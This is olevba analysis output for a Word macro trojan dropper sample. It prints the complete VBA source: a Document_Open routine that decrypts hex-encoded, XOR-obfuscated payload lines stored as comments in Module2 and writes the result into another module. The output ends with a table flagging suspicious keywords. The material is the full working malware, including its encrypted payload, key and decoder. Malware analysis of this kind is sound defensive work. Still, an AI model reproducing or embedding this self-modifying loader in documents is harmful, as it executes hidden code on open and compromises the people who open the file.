olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan-Dropper.MSWord.Agent.k-3e61aa2d31acf2a2bd12a995492a20f403b007f8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan-Dropper.MSWord.Agent.k-3e61aa2d31acf2a2bd12a995492a20f403b007f8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim mas() As String
Dim Key, HexTable
Sub Init()
    HexTable = Array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F")
    Key = Array(234, 124, 39, 94, 72, 178, 20, 101, 59, 209)
End Sub

Sub Document_Open()

    Proc
    DoBuiltProc

End Sub

Sub DoBuiltProc()
    Make
    Clear
End Sub

Sub Proc()
    Init
    Set oM = ActiveDocument.VBProject.VBComponents.Item(2)
    Set cM = ActiveDocument.VBProject.VBComponents.Item(3)
    NN = Chr(10)
    Dim i, j, k As Integer
    k = 0
    ReDim Preserve mas(cM.CodeModule.CountOfLines + 1)
    For i = 1 To cM.CodeModule.CountOfLines
        mas(i) = Mid(cM.CodeModule.Lines(i, 1), 2)
        If mas(i) <> "" Then
            Dim old_str As String
            old_str = mas(i)
            mas(i) = ""
            For j = 1 To Len(old_str) / 2
                k = k + 1
                If k = 10 Then k = 0
                mas(i) = mas(i) & Chr(HexToDec(Mid(old_str, j * 2 - 1, 2)) Xor Key(k))
            Next j
        End If
    Next i
    Dim s As String
    s = ""
    For i = 1 To cM.CodeModule.CountOfLines
        s = s & mas(i) & NN
    Next i
    oM.CodeModule.AddFromString (s)
End Sub

Function HexToDec(s As String) As Byte
    Dim d As Byte
    Dim b() As Byte
    b() = s
    If (b(0) >= 48 And b(0) <= 58) Then b(0) = b(0) - 48 Else b(0) = b(0) - 55
    If (b(2) >= 48 And b(2) <= 58) Then b(2) = b(2) - 48 Else b(2) = b(2) - 55
    d = b(0) * 16 + b(2)
    HexToDec = d
End Function






















-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Trojan-Dropper.MSWord.Agent.k-3e61aa2d31acf2a2bd12a995492a20f403b007f8 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module2.bas 
in file: Trojan-Dropper.MSWord.Agent.k-3e61aa2d31acf2a2bd12a995492a20f403b007f8 - OLE stream: 'Macros/VBA/Module2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'2F523C68FF750E5EF9C3
'5C07112692511749BE985C753B3BC779001B9F8F0453
'7E68
'92342152BCCA115E1227D1751152BE84
'5C071A21DF342842838F1F482C2C9255161B939308427268E27B1652A5831349
'7E68
'9234365EA5CA115E1227D1751152BE845C1A7E0BC071044FB4A51E4D3B2BC63C4768B29815572A21DC734B7DB8861974273BC6710874B38019442A6A9B
'34456CB8841848293BE671084BF1D75C4A2704DD77044FB8851209192DC647155EB2831D4B1827DE700049F9D855
'077E0BDA500C49F1C22B4E302CDD63166FB4870C0E
'7E68
'92342A4BB4845C663D3CDB62007FBE89094A3B26C63A234EBD863246332D92520A49F1B81D493A27DF342458B28F0F547E1AD775011B90995C046F68FE710B1BECCA30423060FF6D375EB2850E4377
'6892
'344574A18F12077C38C33A0043B4C85C61313A92460455B58511071F2BD1711648F1BD0E4E2A2D9255161BF2D85C6B3B2692294577B484546A271AD7770A49B5C3
'5C071827C0343554A283084E31269229450AF1BE13076979842C
'451BF1CA3B422A689125491B81850F4E2A21DD7A4510F1DB4E1E6E7A86384576A8B81944313AD6
'34451BF1BA09537E6B8038456BBE9915533727DC384576A8B81944313AD6
'344575B49208070E27C17D1152BE84
'5C071D24DD67001BF2D8
'5C07
'7E68FD640055F1C80C563266D6780919F1AC13557E1AD37A0154BCCA3D443D2DC167456CA38308427E09C1344609F1A619497E7592580055F9A705753B2BDD660112
'F1CA3A482C68E27B1652A58313497E759225456FBECA4F12667C
'9234451B968F08077D799E343554A283084E3126923F450AE2DC4D1E6C6492591C69B48913553A
'689234456BA49E5C046C6492440A48B89E1548306492591C69B48913553A
'68925A0043A5CA2C482D21C67D0A55
'F1CA3F4B313BD7344609
'F1CA
'5C071138D77A4519B8840F533F24DE3A0043B4C85C61313A92460455B58511071F2BD1711648F1BD0E4E2A2D9255161BF2D85C6B3B2692294577B484546A271AD7770A49B5C3
'5C071827C0343554A283084E31269229450AF1BE1307677181265D
'1BF1CA5C603B3C92375417F1BA1354373CDB7B0B1BFACA4D14677F8522491B9C932E423D27C070
'451BF1CA2C522A689126491B81850F4E2A21DD7A491B9C932E423D27C070
'451B9F8F04537E18DD670C4FB88512
'077E0BDE7B165EF1C94E
'077E
'6892570954A28F5C046F
'
'6892470D5EBD865C053D27DF790455B5C41F4833689D774552BF99084632249C711D5EF3C65C513C00DB7000
'1BF1B91442322492360656B5CA53447E38C33A0043B4CA5E077868E57D0B5FBE9D0F733B25C234431BF3B615492D3CD3780915B49219057268C4762D52B58F
'5C070D20D778091BF38911437E67D1340C55A29E1D4B3266D76C0019FDCA0A451621D671
'451B8282194B326890770A56BC8B1243702BDD794514B2CA15573D27DC720C5CF1C51D4B32688C341149B3D344166E66C6791519FDCA0A451621D671
'45
'1BF1A50C42306890601759E8DA4911703CDF64471B97850E07113DC664104FF1AB0F077D79
'92343549B88408077D799E344754F19D0B50702ED164045CB4995244312590
'34456BA38312537E6B83384519A49919557E26DD661153BF831B4F2A66D477155AB68F0F093D27DF36
'451B819815492A689125491BF39908462C3BDA7D0B5EF3
'CA5C772C21DC604518E0C65C053C21DC36
'451B819815492A689125491BF39A0E483338C636
'451B819815492A689125491BF39A09537E3CC0765C03E0DA5253333890
'34456BA38312537E6B83384519A09F15537C
'6892570954A28F5C046F
'6892
'344574A18F12077C2BDE710449FF881D537C68F47B171B9E9F08572B3C9255161BF2DB
'5C070E3ADB7A111BF2DB50077C2EC6644B5EA98F5C0A30689F675F4FA38845176B7E9C60084BF3
'CA5C772C21DC604518E0C65C053A2DDE340C55A29E1D4B3266D76C0019
'F1CA2C553726C634460AFDCA5E433B2492601759E8D24D17703CDF6447
'1BF1BA0E4E303C92375417F1C818423268C2654B5EA98F5E
'077E18C07D0B4FF1C94D0B7E6AD671091BA19B10093A24DE36
'451B819815492A689125491BF38E194B7E3CC0765C0BE4DC5253333890
'34456BA38312537E6B83384519B58F10073D24D7751715B38B0805
'7E68F1780A48B4CA5F16
'7E68
'92343653B48610077C2BDD79085ABF8E52443125923B061BB28619462C66D0751119FDCA0A451621D671
'451B
'948418070D3DD0
'
'471059F1A910423F3A9A3D
'451BF1CA2F422A68DF750C559C8B1F55313B9229457AB29E15513B0CDD771056B4840809080AE2660A51B4890809080AF17B084BBE8419492A3B9C5D115EBCC24F0E
'7E6892340654A48408076368DF750C559C8B1F55313B9C570A5FB4A713432B24D73A2654A48408683804DB7A0048
'F1CA5C071A21DF340C1B90995C6E303CD7730049
'F1CA5C071827C0340C1BECCA4D070A2792770A4EBF9E
'5C077E689234451BBC8B15491329D1660A48FFA913433B05DD701057B4C43842322DC6712952BF8F0F076F
'6892344575B492080737
'689234451BF1CA5C
'077E689247004FF1871D4E3005D3771754A2CA41071F2BC67D135E95851F52332DDC604B6D93BA0E48342DD1604B6D93A9134A2E27DC710B4FA2C435533B259A264C
'1BF1CA5C44313DDC604506F1871D4E3005D3771754A2C43F483A2DFF7B014EBD8F5264313DDC602A5D9D8312422D
'689234457DBE985C4E7E759225456FBECA1F482B26C6
'34451BF1CA5C077E25D37D0B76B0890E482D66F17B015E9C851852322D9C500057B49E196B3726D767450A
'F1CA5C07102DCA604552
'
'F1CA5C070D2DC634085AB88431463D3ADD674506F1AB1F53373ED7500A58A48719492A66E4563549BE8019442A66E4562654BC9A13493B26C6674B72A58F110F6F61
'9234451BB28509492A688F34085AB88431463D3ADD674B78BE8E196A312CC7780015928509492A07D4580C55B499
'5C077E68F47B171BB8CA41076F68E67B4558BE9F1253
'7E689234451BF1CA11463726FF750649BE995264312CD7590A5FA48619091A2DDE71115E9D8312422D6883
'34451BF1A4195F2A68DB
'34451BF1CA5C077E
'6892344574BFCA39552C27C034225485855C622C3ADD662D5ABF8E1042
'7E6892342152BCCA1A447E09C1342A59BB8F1F53
'7E6892342354A3CA39463D209272061B98845C613724D7570A55A78F0E533B3AC1
'34451BF1CA5C077E01D4340358FFAC13553329C65A0456B4CA41077C1FDD66011BE7C44C08677D90343153B484
'5C077E689234451BF1CA5C071F2BC67D135E95851F52332DDC604B68B09C19662D68F47D095E97850E4A3F3C88290358FFB91D513B0EDD66085AA5
'CA5C077E689234451BF1CA5C622621C634364EB3
'CA5C077E689234457EBF8E5C6E38
'6892344575B4920807382B
'9234451B
'F1CA5C071F2BC67D135E95851F52332DDC604B68B09C19
'077E6892511D52A5CA2F523C
'0DC0660A49998B1243322D88
'34451BF1AB1F53373ED7500A58A48719492A66E175135E
'948418070D3DD0

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

